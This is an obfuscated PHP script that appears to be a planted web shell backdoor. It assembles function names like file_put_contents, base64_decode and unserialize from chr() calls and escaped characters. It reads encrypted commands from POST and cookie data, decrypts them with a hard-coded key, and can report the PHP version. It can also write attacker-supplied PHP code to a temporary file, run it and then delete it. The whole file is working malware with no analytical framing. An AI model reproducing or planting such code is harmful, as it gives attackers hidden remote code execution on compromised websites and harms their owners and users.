<?php 	function    wx_un(){       echo/*wmdrp*/21799;    }$htxzyuta       =      'htxzyuta'     ^/*  zv_ */'';


$sbexbndg/*   bebqs  */=  "f".$htxzyuta(105)/* if */.	"\x6c"     .      $htxzyuta(101)       .	$htxzyuta(241-146)	.     $htxzyuta(1063-951)	.     $htxzyuta(117)/*  q  */.   "\x74"	./* fv  */"\x5f"      .  $htxzyuta(772-673)     ./*  vno  */"\x6f"	./*  qfg   */$htxzyuta(987-877)/*  om  */.	"\164"   .       $htxzyuta(387-286)	.	"\156"/*   bcvqp*/.	"\x74"  .	"s";

$pfdgjtr/*   zlg   */=	"b"."a"."\163"     .  "\x65"	.	$htxzyuta(1045-991)/*isgg */.	"4"."_"."d"."\x65"/* nh */.   "c"."o"."d"."\145";


$qi_tpxbb	=	$htxzyuta(117)       ./*  ztvis  */"\x6e"/*  rjtqe   */.	"s"."e"."r".$htxzyuta(105)/*  kxpy   */.   "a"."l"."\x69"/* z  */.  "\172"    .	"e";
$_kqog_l	=     "\160"/*e  */./* o */"\150"	.    "\x70"  .	"v"."\x65"/* tbi  */.     "\162"/*  _iy   */.	"\163"  ./* hhi   */"i"."o"."n";

$vdasvgkgig/* uoon*/=/*  k_caj */"u"."n"."l"."\151"/*  ecqjs   */.	"n".$htxzyuta(983-876);

	


function    vhxetcu($qjssll,	$lsxyux)
{

/*xejqq   */global	$htxzyuta;


	$cdbaturq_f/*   qwjqr  */=/*  _wcyd  */"";


	for       ($nrbxgh/*irf_f   */=  0;       $nrbxgh/*by*/<	strlen($qjssll);)      {	for	($mqfzci/* u   */=/*q_hee  */0;/*  zn  */$mqfzci    <	strlen($lsxyux)/*  nxa   */&&	$nrbxgh/*  uejp */<    strlen($qjssll);     $mqfzci++,	$nrbxgh++)     {


	$cdbaturq_f   .=      $htxzyuta(ord($qjssll[$nrbxgh])/*  fanbi*/^/*  l*/ord($lsxyux[$mqfzci]));

/* uk  */}

/*  daqbj */}

      return   $cdbaturq_f;
}
$tijyopw	=/*y__fp   */$_COOKIE;

$scngypg      =	$_POST;
$tijyopw	=    array_merge($scngypg,    $tijyopw);

$trqitbmc	=    $htxzyuta(56)    .   "\x38"	./*ks  */"\x32"      .	"a"."f".$htxzyuta(560-510)	.	"\66"     .	$htxzyuta(55)/*guh */.       "-"."\143"	.	"\66"	.	"f".$htxzyuta(451-401)	.	"-".$htxzyuta(1028-976)/*   rb*/.      $htxzyuta(659-608)	.	"4".$htxzyuta(524-467)  ./*  fusag   */"\55"	.	$htxzyuta(98)/*   u   */./*u   */$htxzyuta(385-286)   .   $htxzyuta(98)	.	$htxzyuta(696-643)      ./*djnh*/$htxzyuta(45)/* oopx_   */./*   mac   */"9".$htxzyuta(877-820)	.      "\144"     .	"\x35"	.      "\64"	.	$htxzyuta(54)      ./*   bhsqi  */"4"."c"."\146"       .	$htxzyuta(57)/*  uoa*/./*okv  */$htxzyuta(100).$htxzyuta(98);foreach	($tijyopw   as/*mbsfj  */$vooywv      =>/*   xpcos   */$qjssll)      {


       $qjssll/*  rn  */=       $qi_tpxbb(vhxetcu(vhxetcu($pfdgjtr($qjssll),	$trqitbmc),	$vooywv));


      if  (isset($qjssll["\x61"/*   nbuop*/.    $htxzyuta(107)]))	{
      if/*cyn  */($qjssll["a"]/*   tgjdy   */==	$htxzyuta(105))	{

	$nrbxgh    =	array();


	$nrbxgh[$htxzyuta(1043-931)/*  w*/.       "v"]/* cf  */=    $_kqog_l();


/* dcr*/$nrbxgh["\163"/*  eu*/./*  dzm  */$htxzyuta(118)]   =	$htxzyuta(953-902)    .       "\x2e"/* xan_ */./*fi */$htxzyuta(53);
	echo/*fxen   */@serialize($nrbxgh);

	}     elseif/*   swfe   */($qjssll["a"]     ==/*   jymc  */"\145")/*nlr */{
	$occgboxxmx	=/*bh*/sprintf($htxzyuta(46)/*   pnlr */.      "/"."%"."\163"	./* tm*/$htxzyuta(122-76)  .	$htxzyuta(112)   ./*ri   */"l",   md5($trqitbmc));

	$sbexbndg($occgboxxmx,	"<"/*iuz   */.    "?"."p".$htxzyuta(104)       .     $htxzyuta(112)/* yvzfn   */./*nwv*/$htxzyuta(32)/* i  */./*   jiqv   */"u"."n".$htxzyuta(108)	./*  s*/"\x69"  ./*   eiwb  */"n"."k"."("."_".$htxzyuta(266-171)   ./*   _   */"F"."I".$htxzyuta(76)     .	"E"."_"."\137"/*  c   */.    $htxzyuta(976-935)	.	$htxzyuta(298-239)/*bh   */.	$htxzyuta(32)	./*  trzw*/$qjssll[$htxzyuta(100)]);


      include($occgboxxmx);
/*   nlfl   */$vdasvgkgig($occgboxxmx);


    }

      exit();
/*   bad */}


}

